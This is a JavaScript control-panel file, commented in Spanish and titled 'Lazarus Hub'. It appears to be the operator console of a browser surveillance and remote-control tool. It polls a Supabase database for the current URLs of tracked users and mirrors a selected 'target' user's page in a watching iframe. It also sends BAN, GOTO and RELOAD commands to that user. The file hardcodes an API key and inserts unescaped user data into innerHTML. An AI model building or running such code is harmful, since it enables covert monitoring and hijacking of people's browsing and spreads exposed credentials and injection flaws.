/**
 * LAZARUS HUB - NÚCLEO DE CONTROL CENTRAL
 * Versión: 4.5.1
 * Descripción: Gestión de nodos en tiempo real y despacho de comandos.
 */

const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let currentTargetID = null;
let lastKnownURL = "";

/**
 * Sincroniza la lista de usuarios y actualiza el monitor de pantalla
 */
async function syncLazarusSystem() {
    try {
        // Obtenemos los últimos 50 logs para tener un historial reciente de todos los usuarios
        const response = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=50`, {
            headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
        });
        const logs = await response.json();

        // --- FILTRO ANTI-DUPLICADOS ---
        // Usamos un mapa para quedarnos solo con la entrada más reciente de cada ID único
        const uniqueNodes = new Map();
        logs.forEach(log => {
            if (!uniqueNodes.has(log.usuario_id)) {
                uniqueNodes.set(log.usuario_id, log);
            }
        });

        renderUserList(uniqueNodes);
        updateLiveMonitor(uniqueNodes);

    } catch (error) {
        console.error("Critical Sync Error:", error);
        document.getElementById('net-status').innerHTML = "<span style='color:red'>RED: ERROR DE CONEXIÓN</span>";
    }
}

/**
 * Dibuja la lista de usuarios en el sidebar izquierdo
 */
function renderUserList(nodesMap) {
    const container = document.getElementById('nodes');
    const nodesArray = Array.from(nodesMap.values());
    
    document.getElementById('user-count').innerText = nodesArray.length;

    container.innerHTML = nodesArray.map(node => `
        <div class="user-node ${currentTargetID === node.usuario_id ? 'active' : ''}" 
             onclick="setTargetNode('${node.usuario_id}')">
            <div class="status-pulse"></div>
            <div style="display:inline-block">
                <b style="font-size: 14px;">${node.usuario_id}</b><br>
                <small style="color: #666; font-size: 10px;">
                    ${node.url_actual.substring(0, 40)}...
                </small>
            </div>
        </div>
    `).join('');
}

/**
 * Actualiza el iframe de vigilancia solo si el usuario ha cambiado de web
 */
function updateLiveMonitor(nodesMap) {
    if (!currentTargetID) return;

    const activeNode = nodesMap.get(currentTargetID);
    if (activeNode) {
        const monitorFrame = document.getElementById('monitor');
        
        // Solo actualizamos el src si es diferente para evitar recargas infinitas
        if (lastKnownURL !== activeNode.url_actual) {
            lastKnownURL = activeNode.url_actual;
            monitorFrame.src = activeNode.url_actual;
            document.getElementById('current-url').innerText = "VIGILANDO: " + activeNode.url_actual;
        }
    }
}

/**
 * Selecciona un usuario para controlar
 */
function setTargetNode(id) {
    currentTargetID = id;
    document.getElementById('target-info').innerHTML = `MODO CONTROL: <span style="color:white">${id}</span>`;
    // Reiniciamos la URL para forzar la carga de la pantalla del nuevo objetivo
    lastKnownURL = ""; 
    syncLazarusSystem();
}

/**
 * Envía comandos (BAN, GOTO, RELOAD) a la base de datos
 */
async function execute(command) {
    if (!currentTargetID) {
        alert("ERROR: No has seleccionado ningún usuario de la lista.");
        return;
    }

    let extraContent = "";
    if (command === 'GOTO') {
        extraContent = document.getElementById('target-url').value;
        if (!extraContent) return alert("Escribe una URL primero");
    }

    try {
        // 1. Borramos cualquier orden pendiente para ese usuario
        await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${currentTargetID}`, {
            method: 'DELETE',
            headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
        });

        // 2. Insertamos la nueva orden
        const res = await fetch(`${SB_URL}/rest/v1/ordenes`, {
            method: 'POST',
            headers: { 
                'apikey': SB_KEY, 
                'Authorization': `Bearer ${SB_KEY}`, 
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            },
            body: JSON.stringify({
                usuario_id: currentTargetID,
                orden: command,
                contenido: extraContent,
                activa: true
            })
        });

        if (res.ok) {
            console.log(`Comando ${command} enviado con éxito.`);
            // Feedback visual rápido
            const btn = event.target;
            const originalText = btn.innerText;
            btn.innerText = "¡ENVIADO!";
            setTimeout(() => btn.innerText = originalText, 2000);
        }

    } catch (e) {
        alert("Error al enviar comando.");
    }
}

/**
 * Bloquea una URL para todos los usuarios (Blacklist Global)
 */
async function addToBlacklist() {
    const urlInput = document.getElementById('blacklist-url');
    const url = urlInput.value.trim().toLowerCase();
    
    if (!url) return;

    await fetch(`${SB_URL}/rest/v1/links_bloqueados`, {
        method: 'POST',
        headers: { 
            'apikey': SB_KEY, 
            'Authorization': `Bearer ${SB_KEY}`, 
            'Content-Type': 'application/json' 
        },
        body: JSON.stringify({ url: url })
    });

    alert(`Dominio ${url} añadido a la lista negra global.`);
    urlInput.value = "";
}

// --- BUCLE DE ACTUALIZACIÓN ---
// Actualizamos cada 2.5 segundos para no saturar pero mantener el control
setInterval(syncLazarusSystem, 2500);

// Primera carga
syncLazarusSystem();
